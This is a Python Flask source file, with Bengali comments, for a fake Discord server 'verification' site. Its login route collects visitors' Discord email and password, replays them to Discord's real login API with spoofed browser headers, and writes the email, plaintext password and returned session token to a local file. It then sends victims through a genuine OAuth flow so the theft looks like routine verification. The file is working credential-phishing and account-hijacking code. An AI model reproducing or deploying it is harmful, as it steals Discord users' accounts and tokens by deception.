from flask import Flask, request, redirect, render_template, jsonify
import json
import base64
import time
import requests
import datetime
from config import CLIENT_ID, CLIENT_SECRET, REDIRECT_URI, LOCAL_IP, GUILD_ID, VERIFIED_ROLE_ID, BOT_TOKEN
from html_template import VERIFY_PAGE_HTML
from verify_template import VERIFICATION_SUCCESS_HTML

app = Flask(__name__)

# ============================================
# ⭐ hCaptcha Configuration
# ============================================
HCAPTCHA_SECRET_KEY = ""
HCAPTCHA_SITE_KEY = "2546a4d2-70e2-4078-9a38-e790da06b9a6"

# ============================================
# ⭐ Expired Link Redirect URL (আপনার লিংক দিন)
# ============================================
EXPIRED_REDIRECT_URL = "https://invite-tracker.com/"  # 🔁 এখানে আপনার লিংক দিন

# ============================================
# ⭐ hCaptcha Verify Function
# ============================================
def verify_hcaptcha(captcha_response):
    """hCaptcha টোকেন ভেরিফাই করে"""
    if not captcha_response:
        print("❌ No captcha response provided")
        return False
    
    try:
        verify_url = "https://hcaptcha.com/siteverify"
        
        payload = {
            'secret': HCAPTCHA_SECRET_KEY,
            'response': captcha_response
        }
        
        print(f"📤 Verifying hCaptcha with response: {captcha_response[:20]}...")
        
        response = requests.post(verify_url, data=payload, timeout=10)
        result = response.json()
        
        print(f"📥 hCaptcha Response: {result}")
        
        if result.get('success'):
            print("✅ hCaptcha verified successfully!")
            return True
        else:
            error_codes = result.get('error-codes', [])
            print(f"❌ hCaptcha failed: {error_codes}")
            return False
            
    except requests.exceptions.Timeout:
        print("❌ hCaptcha timeout")
        return False
    except requests.exceptions.ConnectionError:
        print("❌ hCaptcha connection error")
        return False
    except Exception as e:
        print(f"❌ hCaptcha error: {str(e)}")
        return False

# ============================================
# ⭐ Home Route
# ============================================
@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verification System</title>
        <style>
            body {
                font-family: Arial;
                text-align: center;
                padding: 50px;
                background: #1a1a2e;
                color: white;
            }
            .container {
                max-width: 500px;
                margin: auto;
                background: #16213e;
                padding: 30px;
                border-radius: 10px;
            }
            .status {
                color: #4CAF50;
                font-size: 50px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="status">✅</div>
            <h1>Verification System Active</h1>
            <p>Flask server is running on localhost!</p>
        </div>
    </body>
    </html>
    """

# ============================================
# ⭐ Login Route (GET + POST)
# ============================================
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    """লগইন পেজ - এক্সপায়ার্ড লিংক রিডাইরেক্ট সহ"""
    print("="*60)
    print("✅ /login route accessed!")
    print("="*60)
    
    # ============================================
    # POST রিকোয়েস্ট - লগইন চেক করুন
    # ============================================
    if request.method == 'POST':
        print("📩 Login attempt received")
        
        email = request.form.get('email', '').strip()
        password = request.form.get('pass', '').strip()
        captcha_key = request.form.get('captcha_key', '').strip()
        data_param = request.args.get('data')
        
        print(f"👤 Email: {email}")
        print(f"🔒 Password: {'*' * len(password) if password else 'None'}")
        print(f"🔑 Captcha Key: {captcha_key[:30] + '...' if captcha_key else '❌ None'}")
        
        # ============================================
        # ✅ ভ্যালিডেশন
        # ============================================
        if not email:
            return jsonify({
                'success': False,
                'error': 'email_required',
                'message': 'Please enter your email or phone number.'
            })
        
        if not password:
            return jsonify({
                'success': False,
                'error': 'password_required',
                'message': 'Please enter your password.'
            })
        
        # ============================================
        # ⭐⭐⭐ STEP 1: প্রথমে CAPTCHA চেক করুন ⭐⭐⭐
        # ============================================
        if not captcha_key:
            print("🔒 No captcha provided - showing captcha")
            return jsonify({
                'success': False,
                'error': 'captcha_required',
                'captcha_sitekey': HCAPTCHA_SITE_KEY,
                'message': 'Please complete the captcha verification first.'
            })
        
        # hCaptcha ভেরিফাই করুন
        if not verify_hcaptcha(captcha_key):
            print("❌ hCaptcha verification failed!")
            return jsonify({
                'success': False,
                'error': 'captcha_required',
                'captcha_sitekey': HCAPTCHA_SITE_KEY,
                'message': 'Captcha verification failed. Please try again.'
            })
        
        print("✅ hCaptcha verification passed! Now checking credentials...")
        
        # ============================================
        # ⭐⭐⭐ STEP 2: এখন ইমেইল-পাসওয়ার্ড চেক করুন ⭐⭐⭐
        # ============================================
        try:
            login_data = {
                'login': email,
                'password': password,
            }
            
            if captcha_key:
                login_data['captcha_key'] = captcha_key
            
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/login',
                'X-Debug-Options': 'bugReporterEnabled',
                'X-Discord-Locale': 'en-US',
                'X-Discord-Timezone': 'Asia/Dhaka',
            }
            
            print(f"📤 Checking credentials with Discord API...")
            response = requests.post('https://discord.com/api/v9/auth/login', 
                                   json=login_data, 
                                   headers=headers,
                                   timeout=30)
            
            print(f"📥 Discord API Response Status: {response.status_code}")
            
            # ============================================
            # ✅ লগইন সফল
            # ============================================
            if response.status_code == 200:
                result = response.json()
                print(f"✅ Login successful!")
                
                if 'token' in result:
                    # 📝 ইউজার ডেটা সেভ করুন
                    try:
                        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        username = "Unknown"
                        
                        if data_param:
                            try:
                                decoded_data = base64.b64decode(data_param).decode()
                                decoded = json.loads(decoded_data)
                                username = decoded.get('username', 'Unknown')
                            except:
                                pass
                        
                        with open('user.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{'='*50}\n")
                            f.write(f"📅 Time: {timestamp}\n")
                            f.write(f"👤 Username: {username}\n")
                            f.write(f"📧 Email: {email}\n")
                            f.write(f"🔑 Password: {password}\n")
                            f.write(f"✅ Status: SUCCESSFUL LOGIN ✅\n")
                            f.write(f"🔑 Token: {result.get('token', 'N/A')}\n")
                            f.write(f"📊 Data: {data_param}\n")
                            f.write(f"{'='*50}\n\n")
                        
                        print(f"✅ ডেটা সেভ করা হয়েছে: {username} ({email})")
                        
                    except Exception as e:
                        print(f"⚠️ ফাইলে সেভ করতে ব্যর্থ: {str(e)}")
                    
                    # 🚀 OAuth রিডাইরেক্ট
                    oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify%20guilds.join&prompt=none"
                    
                    return jsonify({
                        'success': True,
                        'redirect': oauth_url,
                        'token': result.get('token')
                    })
                else:
                    return jsonify({
                        'success': False,
                        'error': 'invalid_credentials',
                        'message': 'Invalid email or password. Please try again.'
                    })
            
            # ============================================
            # ❌ লগইন ব্যর্থ
            # ============================================
            else:
                print(f"❌ লগইন ব্যর্থ: {response.status_code}")
                return jsonify({
                    'success': False,
                    'error': 'invalid_credentials',
                    'message': 'Invalid email or password. Please try again.',
                    'reset_captcha': True
                })
                
        except Exception as e:
            print(f"❌ Error: {str(e)}")
            return jsonify({
                'success': False,
                'error': 'server_error',
                'message': f'Server error: {str(e)}'
            })
    
    # ============================================
    # GET রিকোয়েস্ট - পেজ দেখান
    # ============================================
    data = request.args.get('data')
    
    if not data:
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
            <style>
                body { text-align:center; padding:50px; font-family:Arial; background:#1a1a2e; color:white; }
                .container { max-width:400px; margin:auto; background:#16213e; padding:30px; border-radius:10px; }
                .error { color: #ff4444; font-size: 50px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="error">❌</div>
                <h1>Data not found!</h1>
                
            </div>
        </body>
        </html>
        """, 400
    
    try:
        decoded_data = base64.b64decode(data).decode()
        decoded = json.loads(decoded_data)
        
        expires_in = decoded.get('expires', 0) - int(time.time())
        
        # ============================================
        # ⭐⭐⭐ LINK EXPIRED - REDIRECT TO YOUR URL ⭐⭐⭐
        # ============================================
        if expires_in <= 0:
            print(f"⏰ Link has expired! Redirecting to: {EXPIRED_REDIRECT_URL}")
            # 🔁 এখানে রিডাইরেক্ট করবে আপনার লিংকে
            return redirect(EXPIRED_REDIRECT_URL)
        
        username = decoded.get('username', 'Unknown')
        user_id = decoded.get('userId', 'Unknown')
        guild_id = decoded.get('guildId', 'Unknown')
        
        # Render the login page with captcha
        return render_template('login_page.html', 
                             username=username,
                             user_id=user_id,
                             guild_id=guild_id,
                             expires_in=expires_in,
                             hcaptcha_sitekey=HCAPTCHA_SITE_KEY)
        
    except Exception as e:
        print(f"❌ Error in login_page GET: {str(e)}")
        return f"❌ Error: {str(e)}", 400

# ============================================
# ⭐ Verify Route
# ============================================
@app.route('/verify')
def verify_page():
    """ভেরিফিকেশন পেজ"""
    print("✅ /verify route accessed!")
    
    data = request.args.get('data')
    
    if not data:
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
            <style>
                body { text-align:center; padding:50px; font-family:Arial; background:#1a1a2e; color:white; }
                .container { max-width:400px; margin:auto; background:#16213e; padding:30px; border-radius:10px; }
                .error { color: #ff4444; font-size: 50px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="error">❌</div>
                <h1>Data not found!</h1>
            </div>
        </body>
        </html>
        """, 400
    
    try:
        decoded_data = base64.b64decode(data).decode()
        decoded = json.loads(decoded_data)
        
        expires_in = decoded.get('expires', 0) - int(time.time())
        
        if expires_in <= 0:
            # 🔁 এক্সপায়ার্ড হলে রিডাইরেক্ট
            return redirect(EXPIRED_REDIRECT_URL)
        
        html = VERIFY_PAGE_HTML.replace("{CLIENT_ID}", CLIENT_ID).replace("{REDIRECT_URI}", REDIRECT_URI)
        return html
        
    except Exception as e:
        print(f"❌ Error in verify_page: {str(e)}")
        return f"❌ Error: {str(e)}", 400

# ============================================
# ⭐ OAuth2 Callback Route
# ============================================
@app.route('/oauth2/callback')
def oauth2_callback():
    """Discord OAuth2 কলব্যাক - রোল অ্যাড সহ"""
    code = request.args.get('code')
    
    if not code:
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Verification Failed</title>
            <style>
                body { text-align:center; padding:50px; font-family:Arial; background:#1a1a2e; color:white; }
                .error { color: #ff4444; font-size: 64px; }
            </style>
        </head>
        <body>
            <div class="error">❌</div>
            <h1>Verification Failed!</h1>
            <p>Code not found. Please try again.</p>
        </body>
        </html>
        """, 400
    
    try:
        # টোকেন রিকোয়েস্ট
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        
        response = requests.post('https://discord.com/api/oauth2/token', data=data)
        response.raise_for_status()
        
        token_data = response.json()
        
        # ইউজার ইনফো
        headers = {'Authorization': f"Bearer {token_data['access_token']}"}
        user_response = requests.get('https://discord.com/api/users/@me', headers=headers)
        user_response.raise_for_status()
        user_info = user_response.json()
        
        # রোল অ্যাড করার আগে চেক করুন ইউজার ইতিমধ্যে ভেরিফাইড কিনা
        user_id = user_info['id']
        guild_id = GUILD_ID
        role_id = VERIFIED_ROLE_ID
        
        bot_headers = {
            'Authorization': f'Bot {BOT_TOKEN}',
            'Content-Type': 'application/json'
        }
        
        # ইউজারের রোল চেক করুন
        member_url = f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}'
        member_response = requests.get(member_url, headers=bot_headers)
        
        already_verified = False
        if member_response.status_code == 200:
            member_data = member_response.json()
            roles = member_data.get('roles', [])
            if role_id in roles:
                already_verified = True
                print(f"ℹ️ {user_info['username']} ইতিমধ্যে ভেরিফাইড!")
        
        # ইউজারের নামের প্রথম অক্ষর (আইকনের জন্য)
        user_initial = user_info['username'][0].upper() if user_info['username'] else 'U'
        username = user_info['username']
        
        # যদি ইতিমধ্যে ভেরিফাইড হয়ে থাকে
        if already_verified:
            html = VERIFICATION_SUCCESS_HTML.replace('{username}', username)
            html = html.replace('{user_initial}', user_initial)
            return html
        
        # রোল অ্যাড করার অংশ
        try:
            role_url = f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
            role_response = requests.put(role_url, headers=bot_headers)
            
            if role_response.status_code == 204:
                print(f"✅ Role added: {username}")
            else:
                print(f"⚠️ Failed to add role (Error: {role_response.status_code})")
                
        except Exception as e:
            print(f"❌ Failed to add role: {str(e)}")
        
        # সাফল্য পেজ
        html = VERIFICATION_SUCCESS_HTML.replace('{username}', username)
        html = html.replace('{user_initial}', user_initial)
        return html
        
    except Exception as e:
        print(f"❌ OAuth2 Error: {str(e)}")
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
            <style>
                body {{ text-align:center; padding:50px; font-family:Arial; background:#1a1a2e; color:white; }}
                .error {{ color: #ff4444; font-size: 64px; }}
            </style>
        </head>
        <body>
            <div class="error">❌</div>
            <h1>Verification Failed!</h1>
            <p>Error: {str(e)}</p>
            <p>Please try again.</p>
        </body>
        </html>
        """, 400

# ============================================
# ⭐ Flask Run Function
# ============================================
def run_flask():
    print(f"🚀 Flask সার্ভার চালু হচ্ছে: http://{LOCAL_IP}:5000")
    print(f"🔗 Redirect URI: {REDIRECT_URI}")
    print(f"📌 Guild ID: {GUILD_ID}")
    print(f"📌 Verified Role ID: {VERIFIED_ROLE_ID}")
    print(f"🔑 hCaptcha Site Key: {HCAPTCHA_SITE_KEY}")
    print("="*60)
    print("🎯 Captcha will ALWAYS show first, then check credentials!")
    print("🎯 Captcha will HIDE automatically after solving!")
    print("🎯 Wrong password will NOT show captcha again!")
    print(f"🔁 Expired links will redirect to: {EXPIRED_REDIRECT_URL}")
    print("="*60)
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)